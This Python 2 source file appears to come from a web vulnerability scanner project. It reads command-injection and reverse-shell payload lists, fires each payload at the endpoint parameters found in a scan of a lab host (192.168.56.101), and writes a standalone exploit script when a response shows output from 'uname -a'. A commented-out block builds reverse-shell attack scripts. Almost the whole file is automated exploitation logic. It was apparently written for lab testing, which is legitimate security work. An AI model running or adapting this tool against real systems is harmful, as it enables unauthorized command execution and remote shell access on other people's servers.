import json
from scanner import make_request
from scanner import make_auth_request

COOKIE_HTTP_HEADER = {'Cookie': 'testcookie'}

with open('./vulnScanScripts/commandInjExploitPayloads.txt') as f:
    commandExecExploitList = list(f)

with open('vulnScanScripts/commandInjExploitRevShellPayloads.txt') as f:
    commandExecExploitRevShellList = list(f)

def exploitCommandInj(vulnJSON):
    exploitDetails = vulnJSON['results'][hostname]
    for index, exploitDetail in enumerate(exploitDetails):
        method = exploitDetail['method']
        params = exploitDetail['params']
        url = hostname + exploitDetail['endpoint']
        for key in params.keys():
            for y in commandExecExploitList:
                params[key] = y.replace("\n", "")
                #response = make_request(method, url, method_params)
                response = make_auth_request(method, url, params, COOKIE_HTTP_HEADER)
                print "\n[*]Searching for the correct exploit..."
                print "[*]Payload used: " + str(params)
                print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
                print "[*]Response content length: " + str(response.headers['content-length'])
                print "[*]Response content: \n" + response.content
                if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
                    print "[*]Exploit found! Generating standalone attack script..."

                    #Generate standalone exploit script to execute uname -a
                    with open('generatedExploits/command_injection'+str(params.keys())+str(index)+'.py', 'w') as exploitFile:
                        if method == "POST":
                            exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                            exploitFile.write('response = requests.post("'+url+'",'+str(params)+')\n')
                            exploitFile.write("print response.content")

                        elif method == "GET":
                            exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                            exploitFile.write('response = requests.get("'+url+'",'+str(params)+')\n')
                            exploitFile.write("print response.content")
                    break
    '''
    # Tries to generate a compatible reverse shell. Manual intervention if necessary. Edit the file 'commandInjExploitRevShellPayloads' if needed.
    for z in commandExecExploitRevShellList:
        for key, value in method_params.items():
            method_params[key] = z.replace("\n", "")
            count=+count+1
            print "[*]Exploit found! Generating standalone attack script (Command injection reverse shell)..."
            with open('command_injection_rev_shell'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
                    if method == "POST":
                        exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                        exploitFile.write('response = requests.post("'+url+'",'+str(method_params).replace("\\'","'")+')\n')
                        exploitFile.write("print response.content")

                    elif method == "GET":
                        exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                        exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
                        exploitFile.write("print response.content")'''

if __name__ == '__main__':
    hostname = "http://192.168.56.101"
    with open('logs/scan_results.json', 'r') as file:
        resultsJSON = json.loads(file.read())
        for key in resultsJSON.keys():
            if key == "Command Injection":
                exploitCommandInj(resultsJSON[key])
            else:
                print key